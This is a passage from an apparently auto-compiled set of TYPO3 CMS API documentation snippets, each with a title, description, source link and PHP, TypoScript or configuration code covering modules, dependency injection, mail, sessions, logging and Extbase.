TYPO3\\CMS\\Backend\\Module;\n\nclass Module\n{\n    public function getRoutes(): array {}\n    public function getDefaultRouteOptions(): array {}\n    public static function createFromConfiguration(string $identifier, array $configuration): static {}\n    public function getIdentifier(): string {}\n    public function getPath(): string {}\n    public function getIconIdentifier(): string {}\n    public function getTitle(): string {}\n    public function getDescription(): string {}\n    public function getShortDescription(): string {}\n    public function isStandalone(): bool {}\n    public function getNavigationComponent(): string {}\n    public function getComponent(): string {}\n    public function getPosition(): array {}\n    public function getAccess(): string {}\n    public function getWorkspaceAccess(): string {}\n    public function getParentIdentifier(): string {}\n    public function setParentModule(\\TYPO3\\CMS\\Backend\\Module\\ModuleInterface $module): void {}\n    public function getParentModule(): ?\\TYPO3\\CMS\\Backend\\Module\\ModuleInterface {}\n    public function hasParentModule(): bool {}\n    public function addSubModule(\\TYPO3\\CMS\\Backend\\Module\\ModuleInterface $module): void {}\n    public function hasSubModule(string $identifier): bool {}\n    public function hasSubModules(): bool {}\n    public function getSubModule(string $identifier): ?\\TYPO3\\CMS\\Backend\\Module\\ModuleInterface {}\n    public function removeSubModule(string $identifier): void {}\n    public function getSubModules(): array {}\n    public function getAppearance(): array {}\n    public function getAliases(): array {}\n    public function getDefaultModuleData(): array {}\n}\n```\n\n----------------------------------------\n\nTITLE: Defining a Singleton Class in TYPO3 using PHP\nDESCRIPTION: This code snippet illustrates how to define a class as a singleton by implementing TYPO3's SingletonInterface. It serves as a guide for extension developers to create singleton services and understand the implications of using this design pattern in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/PhpArchitecture/Singletons.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace Vendor\\SomeExtension;\n\nclass MySingletonClass implements \\TYPO3\\CMS\\Core\\SingletonInterface\n{\n    // …\n}\n\n```\n\n----------------------------------------\n\nTITLE: Creating a Fluid View Using ViewFactoryInterface in PHP\nDESCRIPTION: This snippet demonstrates how to create a Fluid view using the ViewFactoryInterface in a non-Extbase TYPO3 controller. It shows the injection of the ViewFactoryInterface and the creation of a ViewInterface instance using ViewFactoryData.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/UsingFluidInTypo3.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Controller;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse TYPO3\\CMS\\Core\\View\\ViewFactoryInterface;\nuse TYPO3\\CMS\\Core\\View\\ViewFactoryData;\n\nclass MyController\n{\n    public function __construct(\n        protected readonly ViewFactoryInterface $viewFactory,\n    ) {\n    }\n\n    public function someAction(): ResponseInterface\n    {\n        $view = $this->viewFactory->createView(\n            ViewFactoryData::new()\n                ->setTemplateRootPaths(['EXT:my_extension/Resources/Private/Templates'])\n                ->setPartialRootPaths(['EXT:my_extension/Resources/Private/Partials'])\n                ->setLayoutRootPaths(['EXT:my_extension/Resources/Private/Layouts'])\n        );\n        $view->assignMultiple([\n            'foo' => 'bar',\n        ]);\n        return $view->render('MyTemplate');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Interface Injection in TYPO3 Controller (PHP)\nDESCRIPTION: Demonstrates interface injection where a UserRepositoryInterface is injected instead of a concrete class. This allows for more flexible and loosely coupled dependencies.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DependencyInjection/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace MyVendor\\MyExtension\\Controller;\n\nuse MyVendor\\MyExtension\\Domain\\Repository\\UserRepositoryInterface;\n\nclass UserController\n{\n    public function __construct(\n        private readonly UserRepositoryInterface $userRepository\n    ) {\n    }\n\n    public function listAction(): void\n    {\n        $users = $this->userRepository->findAll();\n        // ...\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Checking Table Modify Access in TYPO3\nDESCRIPTION: Verifies if the backend user has modification rights for the 'pages' table.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendUserObject.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['BE_USER']->check('tables_modify', 'pages');\n```\n\n----------------------------------------\n\nTITLE: Service Using Cache Manager in TYPO3\nDESCRIPTION: Example of a service using the CacheManager to access runtime cache.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DependencyInjection/Index.rst#2025-04-16_snippet_9\n\nLANGUAGE: php\nCODE:\n```\nclass MyServiceUsingCacheManager {\n    public function __construct(\n        private readonly CacheManager $cacheManager\n    ) {}\n\n    public function doSomething(): string\n    {\n        $runtimeCache = $this->cacheManager->getCache('runtime');\n        // Use runtime cache\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring LinkHandler in Page TSconfig\nDESCRIPTION: This Page TSconfig snippet shows the minimal configuration required for setting up a custom LinkHandler. It specifies the handler class, label, and basic configuration for the record table.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Linkhandler/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: typoscript\nCODE:\n```\nTCEMAIN.linkHandler.anIdentifier {\n    handler = TYPO3\\CMS\\Backend\\LinkHandler\\RecordLinkHandler\n    label = LLL:EXT:extension/Resources/Private/Language/locallang.xlf:link.customTab\n    configuration {\n        table = tx_example_domain_model_item\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Default Mail Sender in PHP\nDESCRIPTION: Demonstrates how to use the default mail sender configuration when creating a new MailMessage instance.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Mail/Index.rst#2025-04-16_snippet_17\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Mail\\MailMessage;\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\nuse TYPO3\\CMS\\Core\\Utility\\MailUtility;\n\n$from = MailUtility::getSystemFrom();\n$email = new MailMessage();\n\n// As getSystemFrom() returns an array we need to use the setFrom method\n$email->setFrom($from);\n// ...\n$email->send();\n```\n\n----------------------------------------\n\nTITLE: Using Dependency Injection in Console Commands\nDESCRIPTION: Example of using dependency injection in TYPO3 console commands through constructor injection of a LoggerInterface and SiteFinderInterface.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CommandControllers/Tutorial.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace T3docs\\Examples\\Command;\n\nuse Psr\\Log\\LoggerInterface;\nuse Symfony\\Component\\Console\\Command\\Command;\nuse Symfony\\Component\\Console\\Input\\InputInterface;\nuse Symfony\\Component\\Console\\Output\\OutputInterface;\nuse TYPO3\\CMS\\Core\\Site\\SiteFinder;\n\nfinal class InjectExampleCommand extends Command\n{\n    protected SiteFinder $siteFinder;\n    protected LoggerInterface $logger;\n\n    public function __construct(\n        SiteFinder $siteFinder,\n        LoggerInterface $logger\n    ) {\n        $this->siteFinder = $siteFinder;\n        $this->logger = $logger;\n\n        parent::__construct();\n    }\n\n    protected function execute(InputInterface $input, OutputInterface $output): int\n    {\n        // Use injected dependencies\n        $allSites = $this->siteFinder->getAllSites();\n        $this->logger->info('Found ' . count($allSites) . ' sites');\n\n        return Command::SUCCESS;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying Basic Directory Structure of EXT:tea Extension in TYPO3\nDESCRIPTION: Shows the top-level directory structure of a TYPO3 extension, including the main folders Classes, Configuration, Documentation, Resources, Tests, and required files.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Tea/DirectoryStructure.rst#2025-04-16_snippet_0\n\nLANGUAGE: none\nCODE:\n```\n$ tree /path/to/extension/tea\n├── Classes\n├── Configuration\n├── Documentation\n├── Resources\n├── Tests\n├── composer.json\n├── ext_emconf.php\n├── ...\n└── README.md\n```\n\n----------------------------------------\n\nTITLE: Generating XML Sitemap Items in TYPO3\nDESCRIPTION: Example of implementing getItems() method for a custom XML sitemap provider. Shows how to structure sitemap items with location and last modified timestamp. Optional changefreq and priority parameters can be included.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/XmlSitemap.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n$this->items[] = [\n    'loc' => 'https://example.org/page1.html',\n    'lastMod' => '1536003609'\n];\n```\n\n----------------------------------------\n\nTITLE: Using String Validator in PHP\nDESCRIPTION: Example of applying the String validator to ensure a mixed variable contains a string value and not an array, number, or boolean.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Validation/Validators/Index.rst#2025-04-16_snippet_12\n\nLANGUAGE: php\nCODE:\n```\n#[Validate(['validator' => 'String'])]\nprotected mixed $comment;\n```\n\n----------------------------------------\n\nTITLE: Backend Password Reset CLI Command Format\nDESCRIPTION: The format of the CLI command to reset a backend user's password, showing the required parameters.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/AccessControl/PasswordReset/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nbackend:resetpassword <backend_url> <email_address>\n```\n\n----------------------------------------\n\nTITLE: Accessing var path using Environment class in TYPO3\nDESCRIPTION: This code demonstrates how to use the Environment class to get the path to the var folder which contains logs, sessions, locks, and cache files. The path differs between Composer-based and legacy installations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Environment/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Core\\Environment;\n\n// Composer-based installations: '/path/to/my-project/var/`\n// Legacy installations: '/path/to/my-project/typo3temp/var/'\n$pathToLabels = Environment::getVarPath();\n```\n\n----------------------------------------\n\nTITLE: Defining TYPO3 Backend ModuleInterface\nDESCRIPTION: Interface definition that specifies required methods for TYPO3 backend modules. Includes methods for module identification, routing, permissions, appearance, and module hierarchy management.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Backend/ModuleInterface.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Backend\\Module;\n\ninterface ModuleInterface {\n    public function getIdentifier(): string;\n    public function getPath(): string;\n    public function getIconIdentifier(): string;\n    public function getTitle(): string;\n    public function getDescription(): string;\n    public function getShortDescription(): string;\n    public function isStandalone(): bool;\n    public function getComponent(): string;\n    public function getNavigationComponent(): string;\n    public function getPosition(): array;\n    public function getAppearance(): array;\n    public function getAccess(): string;\n    public function getWorkspaceAccess(): string;\n    public function getParentIdentifier(): string;\n    public function getParentModule(): ?ModuleInterface;\n    public function hasParentModule(): bool;\n    public function hasSubModule(string $identifier): bool;\n    public function hasSubModules(): bool;\n    public function getSubModule(string $identifier): ?ModuleInterface;\n    public function getSubModules(): array;\n    public function getDefaultRouteOptions(): array;\n    public function getDefaultModuleData(): array;\n    public function getAliases(): array;\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing labels path using Environment class in TYPO3\nDESCRIPTION: This code shows how to use the Environment class to get the path to translation files. The path differs between Composer-based and legacy installations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Environment/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Core\\Environment;\n\n// Composer-based installations: '/path/to/my-project/var/labels/`\n// Legacy installations: '/path/to/my-project/typo3conf/l10n/'\n$pathToLabels = Environment::getLabelsPath();\n```\n\n----------------------------------------\n\nTITLE: Using Language Key in Fluid Template for Translations\nDESCRIPTION: Shows how to use the assigned language key within a Fluid template for translations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Mail/Index.rst#2025-04-16_snippet_11\n\nLANGUAGE: html\nCODE:\n```\n<f:translate languageKey=\"{language}\" id=\"LLL:EXT:my_ext/Resources/Private/Language/emails.xml:subject\" />\n```\n\n----------------------------------------\n\nTITLE: Extbase Cascade Annotation Example\nDESCRIPTION: This snippet illustrates the `Cascade` annotation in Extbase.  Applied to a model property representing a relationship, it ensures that child entities are removed when the parent aggregate root is deleted.  The example shows cascading the removal of posts when a blog is deleted.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Annotations.rst#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace TYPO3Documentation\\BlogExample\\Domain\\Model;\n\nuse TYPO3\\CMS\\Extbase\\Annotation as Extbase;\n\nclass Blog extends \\TYPO3\\CMS\\Extbase\\DomainObject\\AbstractEntity\n{\n    /**\n     * @var string\n     */\n    protected $title = '';\n\n    /**\n     * @var string\n     */\n    protected $description = '';\n\n    /**\n     * @Extbase\\ORM\\Cascade(\"remove\")\n     * @var \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage<Post>\n     */\n    protected $posts = null;\n\n    /**\n     * __construct\n     */\n    public function __construct()\n    {\n        //Do not modify this method. It enables initialization of all ObjectStorage properties.\n        //See https://docs.typo3.org/typo3cms/ExtbaseFluidBook/6-Persistence/2-model-properties.html\n        $this->posts = new \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage();\n    }\n\n    /**\n     * Returns the title\n     *\n     * @return string $title\n     */\n    public function getTitle()\n    {\n        return $this->title;\n    }\n\n    /**\n     * Sets the title\n     *\n     * @param string $title\n     * @return void\n     */\n    public function setTitle(string $title)\n    {\n        $this->title = $title;\n    }\n\n    /**\n     * Returns the description\n     *\n     * @return string $description\n     */\n    public function getDescription()\n    {\n        return $this->description;\n    }\n\n    /**\n     * Sets the description\n     *\n     * @param string $description\n     * @return void\n     */\n    public function setDescription(string $description)\n    {\n        $this->description = $description;\n    }\n\n    /**\n     * Adds a Post\n     *\n     * @param Post $post\n     * @return void\n     */\n    public function addPost(Post $post)\n    {\n        $this->posts->attach($post);\n    }\n\n    /**\n     * Removes a Post\n     *\n     * @param Post $postToRemove The Post to be removed\n     * @return void\n     */\n    public function removePost(Post $postToRemove)\n    {\n        $this->posts->detach($postToRemove);\n    }\n\n    /**\n     * Returns the posts\n     *\n     * @return \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage<Post>\n     */\n    public function getPosts()\n    {\n        return $this->posts;\n    }\n\n    /**\n     * Sets the posts\n     *\n     * @param \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage<Post> $posts\n     * @return void\n     */\n    public function setPosts(\\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage $posts)\n    {\n        $this->posts = $posts;\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Locale Example Implementation\nDESCRIPTION: Example showing how to use the Locale class with LanguageServiceFactory to create language-specific services for translations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/LocalizationApi/Locale.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\nnamespace MyVendor\\MyExtension;\n\nuse TYPO3\\CMS\\Core\\Localization\\LanguageServiceFactory;\nuse TYPO3\\CMS\\Core\\Localization\\Locale;\n\nfinal class LocaleExample\n{\n    private LanguageServiceFactory $languageServiceFactory;\n\n    public function __construct(LanguageServiceFactory $languageServiceFactory)\n    {\n        $this->languageServiceFactory = $languageServiceFactory;\n    }\n\n    public function doSomething(): void\n    {\n        // Create language service for French language\n        $locale = new Locale('fr');\n        $languageService = $this->languageServiceFactory->create($locale);\n        $translatedLabel = $languageService->sL('LLL:EXT:my_extension/Resources/Private/Language/locallang.xlf:my.label');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Removing old TYPO3 extensions\nDESCRIPTION: This code snippet demonstrates the wrong approach of renaming old extension directories instead of deleting them, which can potentially leave insecure code on the server.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GeneralGuidelines/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: none\nCODE:\n```\n\n   :caption: Remove old extensions, dont rename\n\n    typo3conf/ext/insecure_extension.bak\n    typo3conf/ext/insecure_extension.delete_me\n    typo3conf/ext/insecure_extension-1.2.3\n    ...\n\n```\n\n----------------------------------------\n\nTITLE: Using DebounceEvent Strategy in TYPO3 JavaScript Event API\nDESCRIPTION: Demonstrates the DebounceEvent strategy which is suitable for events triggered frequently but where the event listener should only be called after a certain wait time. The example delays handling the input event until 250ms have passed.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/EventApi/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nimport DebounceEvent from '@typo3/core/event/debounce-event.js';\n\nnew DebounceEvent('input', function(e) {\n  // Debounced event handling code\n}, 250).bindTo(document.querySelector('.my-input-field'));\n```\n\n----------------------------------------\n\nTITLE: Implementing PostRepository Class in TYPO3 Extbase\nDESCRIPTION: This class defines the PostRepository for a TYPO3 blog extension. It includes methods for finding posts by tag and blog, and for retrieving all posts sorted by category. The class utilizes Extbase's QueryInterface for constructing database queries.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Domain/CustomMethods.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse T3docs\\BlogExample\\Domain\\Model\\Blog;\nuse TYPO3\\CMS\\Extbase\\Persistence\\QueryInterface;\nuse TYPO3\\CMS\\Extbase\\Persistence\\QueryResultInterface;\n\nclass PostRepository extends Repository\n{\n    public function findByTagAndBlog(\n        string $tag,\n        Blog $blog,\n    ): QueryResultInterface {\n        $query = $this->createQuery();\n        return $query\n            ->matching(\n                $query->logicalAnd(\n                    $query->equals('blog', $blog),\n                    $query->equals('tags.name', $tag),\n                ),\n            )\n            ->execute();\n    }\n\n    public function findAllSortedByCategory(array $uids): QueryResultInterface\n    {\n        $q = $this->createQuery();\n        $q->matching($q->in('uid', $uids));\n        $q->setOrderings([\n            'categories.title' => QueryInterface::ORDER_ASCENDING,\n            'uid' => QueryInterface::ORDER_ASCENDING,\n        ]);\n        return $q->execute();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Adding OpenGraph Title Meta Tag in PHP\nDESCRIPTION: Demonstrates how to use the MetaTag API to add an OpenGraph title meta tag in a TYPO3 controller.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/MetaTagApi.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Core\\MetaTag\\MetaTagManagerRegistry;\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\n\n$metaTagManager = GeneralUtility::makeInstance(MetaTagManagerRegistry::class)->getManagerForProperty('og:title');\n$metaTagManager->addProperty('og:title', 'This is the OG title from a controller');\n```\n\n----------------------------------------\n\nTITLE: Generating JSON Response with TYPO3 Extbase\nDESCRIPTION: This snippet illustrates how to generate a JSON response using the jsonResponse() method in TYPO3 Extbase. It suggests not using Fluid for JSON due to character limitations and demonstrates outputting a JSON string directly. Ensure JSON is properly formatted.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/View/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n\\include:: /CodeSnippets/Extbase/View/JsonResponseCustom.rst.txt\n```\n\n----------------------------------------\n\nTITLE: Configuring RecordLinkHandler in Page TSconfig\nDESCRIPTION: This snippet demonstrates how to configure the RecordLinkHandler in Page TSconfig to create a new tab in the LinkBrowser for selecting records. It specifies the handler class, label, and configuration options.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Linkhandler/RecordLinkHandler.rst#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nTCEMAIN.linkHandler.anIdentifier {\n    handler = TYPO3\\CMS\\Backend\\LinkHandler\\RecordLinkHandler\n    label = LLL:EXT:extension/Resources/Private/Language/locallang.xlf:link.customTab\n    configuration {\n        table = tx_example_domain_model_item\n    }\n    scanAfter = page\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Mail Spool Settings in PHP\nDESCRIPTION: Sets up the mail spool configuration for TYPO3, specifying the spool type as 'file' and defining the filepath for storing spooled emails.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Mail/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport_spool_type'] = 'file';\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport_spool_filepath'] = '/folder/of/choice';\n```\n\n----------------------------------------\n\nTITLE: Configuring Database Session Storage in TYPO3\nDESCRIPTION: Configuration for database session storage backend for both frontend and backend users. Defines table names and anonymous session settings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/Sessions/SessionStorage.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n'SYS' => [\n    'session' => [\n        'BE' => [\n            'backend' => \\TYPO3\\CMS\\Core\\Session\\Backend\\DatabaseSessionBackend::class,\n            'options' => [\n                'table' => 'be_sessions'\n            ]\n        ],\n        'FE' => [\n            'backend' => \\TYPO3\\CMS\\Core\\Session\\Backend\\DatabaseSessionBackend::class,\n            'options' => [\n                'table' => 'fe_sessions',\n                'has_anonymous' => true,\n            ]\n        ]\n    ],\n],\n```\n\n----------------------------------------\n\nTITLE: Processing DataHandler Operations in TYPO3 PHP\nDESCRIPTION: This snippet shows how to execute the actual DataHandler operations after initialization. It calls the process_datamap() and process_cmdmap() methods to perform the database operations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DataHandler/Database/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$this->dataHandler->process_datamap();\n$this->dataHandler->process_cmdmap();\n```\n\n----------------------------------------\n\nTITLE: Finding TYPO3 Site by Identifier\nDESCRIPTION: Method to retrieve a specific site configuration by its unique identifier. Returns a Site entity object.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Core/SiteFinder.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\ngetSiteByIdentifier(string $identifier): \\TYPO3\\CMS\\Core\\Site\\Entity\\Site\n```\n\n----------------------------------------\n\nTITLE: Referencing Documentation File Paths in TYPO3 Extensions using reStructuredText\nDESCRIPTION: This code snippet shows the file path references for TYPO3 extension documentation. It displays the path pattern for both full documentation stored in the Documentation directory and the single file documentation approach using README.rst.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Documentation.rst#2025-04-16_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n..  index:\n    Extension development; Documentation\n    Path; EXT:{extkey}/Documentation/\n```\n\n----------------------------------------\n\nTITLE: Defining Simple Backend Layout with TSconfig in TYPO3\nDESCRIPTION: Example of a simple backend layout definition using page TSconfig. This creates a layout with two rows and one column, setting up basic identifiers and column positions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendLayout.rst#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nmod {\n  web_layout {\n    BackendLayouts {\n      exampleKey {\n        title = Example\n        config {\n          backend_layout {\n            colCount = 1\n            rowCount = 2\n            rows {\n              1 {\n                columns {\n                  1 {\n                    identifier = border\n                    name = LLL:EXT:frontend/Resources/Private/Language/locallang_ttc.xlf:colPos.I.3\n                    colPos = 3\n                    colspan = 1\n                  }\n                }\n              }\n              2 {\n                columns {\n                  1 {\n                    identifier = main\n                    name = Main\n                    colPos = 0\n                    colspan = 1\n                  }\n                }\n              }\n            }\n          }\n        }\n        icon = EXT:example_extension/Resources/Public/Images/BackendLayouts/default.gif\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Direct Log Method with LogLevel in TYPO3\nDESCRIPTION: Example of using the generic log() method directly with a specified severity level from LogLevel constants. This approach provides more flexibility when the severity needs to be determined dynamically.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Quickstart/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n// use Psr\\Log\\LogLevel;\n\n$this->logger->log(LogLevel::CRITICAL, 'This is an utter failure!');\n```\n\n----------------------------------------\n\nTITLE: Configuring DocHeader with Buttons in TYPO3 Backend Module\nDESCRIPTION: PHP method that demonstrates how to set up the DocHeader in a TYPO3 backend module. It shows the creation of various button types including link buttons and adding them to the button bar.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/BackendModule/CreateModule.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n/**\n * Set up the doc header\n */\nprotected function setUpDocHeader(): void\n{\n    $buttonBar = $this->view->getDocHeaderComponent()->getButtonBar();\n\n    // Create a button\n    $moduleName = $this->request->getAttribute('route')->getOption('moduleName');\n    $closeButton = $buttonBar->makeLinkButton()\n        ->setHref('#')\n        ->setTitle('Close module')\n        ->setShowLabelText(true)\n        ->setIcon($this->view->getIconFactory()->getIcon('actions-close', Icon::SIZE_SMALL));\n    $buttonBar->addButton($closeButton);\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Message Routing in TYPO3\nDESCRIPTION: PHP configuration to set up message routing for specific message types. This example routes a specific message class to a custom transport, with a default for all other messages.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/MessageBus/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: PHP\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['messenger'] = [\n    'routing' => [\n        // Use \"messenger.transport.demo\" as transport for DemoMessage\n        \\MyVendor\\MyExtension\\Queue\\Message\\DemoMessage::class => 'demo',\n\n        // Use \"messenger.transport.default\" as transport for all other messages\n        '*' => 'default',\n    ]\n];\n```\n\n----------------------------------------\n\nTITLE: Using Expression Builder IF Statement in PHP\nDESCRIPTION: Demonstrates the use of ExpressionBuilder::if() for creating \"if-then-else\" expressions in database queries.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/Index.rst#2025-04-16_snippet_10\n\nLANGUAGE: PHP\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n\n$queryBuilder\n    ->selectLiteral(\n```\n\n----------------------------------------\n\nTITLE: Configuring Error Display in Apache .htaccess for Debugging\nDESCRIPTION: Apache .htaccess configuration to enable PHP error display and logging for debugging purposes. Configures PHP to show errors in the browser and write them to a log file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ErrorAndExceptionHandling/Examples/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: apacheconf\nCODE:\n```\nphp_flag display_errors on\nphp_flag log_errors on\nphp_value error_log /path/to/php_error.log\n```\n\n----------------------------------------\n\nTITLE: Querying User Password Hash in MariaDB\nDESCRIPTION: Example SQL query showing the structure of a stored password hash using Argon2id algorithm for a frontend user in TYPO3's database.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/PasswordHashing/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nMariaDB [cms]> SELECT uid,username,password FROM fe_users WHERE uid=2;\n+-----+----------+----------------------------------------------------------------------------------------------------+\n| uid | username | password                                                                                           |\n+-----+----------+----------------------------------------------------------------------------------------------------+\n|   2 | someuser | $argon2id$v=19$m=65536,t=16,p=1$NkVhNmt5Ynl6ZDRkV1RlZw$16iztnV7xYJDlsG0hEL9sLGDGFC/WQx34ogfoWHBVJI |\n+-----+----------+----------------------------------------------------------------------------------------------------+\n1 row in set (0.01 sec)\n```\n\n----------------------------------------\n\nTITLE: Setting Recommended MFA Provider via TSconfig\nDESCRIPTION: TSconfig configuration to set a recommended MFA provider for specific users or user groups. This setting overrides the global recommended provider 